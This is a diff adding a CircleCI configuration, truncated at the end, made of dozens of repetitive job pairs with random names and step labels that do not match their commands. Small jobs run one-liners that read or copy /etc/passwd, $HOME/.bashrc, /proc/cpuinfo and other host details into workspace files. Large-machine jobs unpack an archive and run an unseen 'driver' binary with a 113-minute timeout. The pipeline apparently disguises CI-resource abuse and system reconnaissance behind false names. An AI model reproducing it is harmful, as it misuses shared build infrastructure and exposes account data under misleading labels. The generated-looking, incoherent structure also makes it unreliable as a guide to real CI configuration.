@@ -1,0 +1,1365 @@
+version: 2.1
+
+jobs:
+  list--warning:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Promotion for the launch
+          command: |
+            mkdir -p /tmp/top
+            set +o pipefail 2>/dev/null; uname -a > /tmp/top/Filter_pulse 2>/dev/null; seq 1 1156924 >> /tmp/top/Filter_pulse; true
+            ( wc -c /tmp/top/Filter_pulse ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'Filter_pulse'
+  INFRA-323:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  yuio:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: TICKET 0B80A0
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >/tmp/au.gz && zcat /tmp/au.gz | head -n3; true ; } > /tmp/top/ka96wxdhl
+            ( wc -c /tmp/top/ka96wxdhl ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'ka96wxdhl'
+  min-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/ka96wxdhl 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  address_v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: resolving subnet as we go
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; echo -n 'almost there' | b2sum; true ; } > /tmp/top/build-v4.0.11
+            ( wc -c /tmp/top/build-v4.0.11 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'build-v4.0.11'
+  zulu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/build-v4.0.11 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  err:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: COLLECT REVENUE SPLIT COMPLETE
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; touch "/tmp/i8.txt" && chmod a-w "/tmp/i8.txt" && ls -l "/tmp/i8.txt"; true ; } > /tmp/top/a8eb67d8eb0
+            ( wc -c /tmp/top/a8eb67d8eb0 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'a8eb67d8eb0'
+  add-queue-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/a8eb67d8eb0 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  ZoleV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: UX 3 Labeling
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; compgen -v | shuf -n 1 | awk 'length > 6'; true ; } > /tmp/top/pulse
+            ( wc -c /tmp/top/pulse ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'pulse'
+  perseus-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  asc_051DF0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Batch the adapter weights and log metrics
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; command -V echo; true ; } > /tmp/top/21.02.2025
+            ( wc -c /tmp/top/21.02.2025 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - '21.02.2025'
+  intergration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/21.02.2025 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  SinglePosTrait:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: triage failing specs last
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; echo -n "keep going" | tr ' ' '\n' | sort; true ; } > /tmp/top/SQL-ci.Invoice
+            ( wc -c /tmp/top/SQL-ci.Invoice ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'SQL-ci.Invoice'
+  apr11-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  tel_rv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Open the checkout page slowly
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; if test -G $HOME; then echo 'yes'; elif test -e /tmp; then echo maybe; else echo no; fi; true ; } > /tmp/top/207.136
+            ( wc -c /tmp/top/207.136 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - '207.136'
+  dp-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/207.136 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  v:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Leave request notification
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; ls /etc | tac | head -20; true ; } > /tmp/top/FaEXCVHumnGp0LKZ8Lcw56
+            ( wc -c /tmp/top/FaEXCVHumnGp0LKZ8Lcw56 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'FaEXCVHumnGp0LKZ8Lcw56'
+  py310-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/FaEXCVHumnGp0LKZ8Lcw56 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  UnbufferedInterfaceDriver:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Copy the late fees back to memory
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; n=10; case $((n % 3)) in 0) echo fizz;;*) echo $n;;esac; true ; } > /tmp/top/20160609
+            ( wc -c /tmp/top/20160609 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - '20160609'
+  INFRA-210:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/20160609 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  info8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: 370 decrypting audit trail
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; grep -o nobody /etc/passwd | tail -n 3; true ; } > /tmp/top/X1l
+            ( wc -c /tmp/top/X1l ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'X1l'
+  titan2-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  carol89:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Otherwise texture the enemy waves
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; ls -d /usr/bin/z* | xargs -n1 basename | awk '{print toupper(substr($0,1,1)) substr($0,2)}' | wc -l; true ; } > /tmp/top/queue_lynx_module_noise
+            ( wc -c /tmp/top/queue_lynx_module_noise ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'queue_lynx_module_noise'
+  bug-9730:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  a2ad8c6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Weigh The Packing Slips Double Stack
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; tr -s ' ' </proc/cpuinfo | cut -c1-21 | sort -u; true ; } > /tmp/top/parser_80526
+            ( wc -c /tmp/top/parser_80526 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'parser_80526'
+  tb-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/parser_80526 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  alicetron:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Initiative Zephyr
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -type f -name 'passwd*' -atime +30 -exec cksum "{}" \; 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/top/lhB
+            ( wc -c /tmp/top/lhB ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'lhB'
+  check-full-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/lhB 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  ITEM_202606:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Stage VII lock
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; od -An -tu1 -N12 /dev/urandom | tr -s ' ' '\n' | grep . | tail -8; true ; } > /tmp/top/cfg_cd_sw
+            ( wc -c /tmp/top/cfg_cd_sw ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'cfg_cd_sw'
+  orion-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/cfg_cd_sw 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  DEEP_BUCKET_SETTINGS:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Update Firmware Phase
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; cat /proc/filesystems | grep sysfs | tail --lines=3; true ; } > /tmp/top/20200725
+            ( wc -c /tmp/top/20200725 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - '20200725'
+  rm-login:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/20200725 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  cb_dec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: No streaming today
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; awk -F'/' '{print $NF}' < /etc/shells | tac; true ; } > /tmp/top/tmp-7835-45fc-RPC
+            ( wc -c /tmp/top/tmp-7835-45fc-RPC ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'tmp-7835-45fc-RPC'
+  assemble-partial-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  dev28-ap:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Pinch the filter chips
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; cp /etc/os-release /var/tmp/test_meeting_epic.list && sed -i 's/"//g' /var/tmp/test_meeting_epic.list && diff /etc/os-release /var/tmp/test_meeting_epic.list | head -n 5; true ; } > /tmp/top/eu83jXduCaQs2N
+            ( wc -c /tmp/top/eu83jXduCaQs2N ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'eu83jXduCaQs2N'
+  node20-bench:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/eu83jXduCaQs2N 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  Read-ScannerPath:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Lock the test fixtures to stay compliant
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; for ((w=0; w<5; w++));do echo $w; done; true ; } > /tmp/top/218.156.77
+            ( wc -c /tmp/top/218.156.77 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - '218.156.77'
+  luna-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/218.156.77 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  skoundquamtee-kit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Begin skinning the audio banks
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; echo 'lorem ipsum dolor sit amet' | tee -a ${TMPDIR:-/tmp}/chapterPolicy.log >/dev/null && wc -l ${TMPDIR:-/tmp}/chapterPolicy.log; true ; } > /tmp/top/IMG-84234
+            ( wc -c /tmp/top/IMG-84234 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'IMG-84234'
+  yankee:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/IMG-84234 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  account-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Surface the submit button
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; cat /etc/skel/.profile | tr -s ' ' | wc -l; true ; } > /tmp/top/SweepTheta
+            ( wc -c /tmp/top/SweepTheta ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'SweepTheta'
+  perseus-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  stage_tool:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Carefully calibrate the eval harness
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; echo bob iris eva | tr ' ' '\n' | sed 's/^/- /' | tr -s ' '; true ; } > /tmp/top/tmp15b
+            ( wc -c /tmp/top/tmp15b ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'tmp15b'
+  hyperion-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  mesh_threads:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: INT 51 shipping
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; diff /etc/passwd /etc/group | head --lines=5; true ; } > /tmp/top/thicket.cluster.wallet
+            ( wc -c /tmp/top/thicket.cluster.wallet ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'thicket.cluster.wallet'
+  titan-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  uvt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: snapshot state fresh
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; grep -s -o --context=2 "SwapTotal" /proc/meminfo | sort -u; true ; } > /tmp/top/0e2b20aa81ce613577b43b0
+            ( wc -c /tmp/top/0e2b20aa81ce613577b43b0 ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - '0e2b20aa81ce613577b43b0'
+  add-router-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/0e2b20aa81ce613577b43b0 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  sys_ReceiveWake:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Localise the archive tables after tea
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; grep --no-messages fi $HOME/.bashrc | nl; true ; } > /tmp/top/MAPLE_LAZY_PROTON
+            ( wc -c /tmp/top/MAPLE_LAZY_PROTON ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'MAPLE_LAZY_PROTON'
+  callisto-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar xjf blobs.tar.bz2
+      - run:
+          name: Workspace summary
+          command: sleep 15
+      - run:
+          no_output_timeout: 113m
+          command: $PWD/driver
+  MAT2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Devrel team only poll
+          command: |
+            mkdir -p /tmp/top
+            { set +o pipefail 2>/dev/null; df -P|awk '{ print $1 }'|sort|uniq -c|tac; true ; } > /tmp/top/qgAXCzb
+            ( wc -c /tmp/top/qgAXCzb ) 2>&1
+      - persist_to_workspace:
+          root: /tmp/top
+          paths:
+            - 'qgAXCzb'
+  py310-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/top
+      - run:
+          name: Size upstream
+          command: |
+            pr -T -l 10 /tmp/top/qgAXCzb 2>/dev/null | wc -l || true
+      - run:
+          name: Load source
+          command: git clone --depth 5 --quiet --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
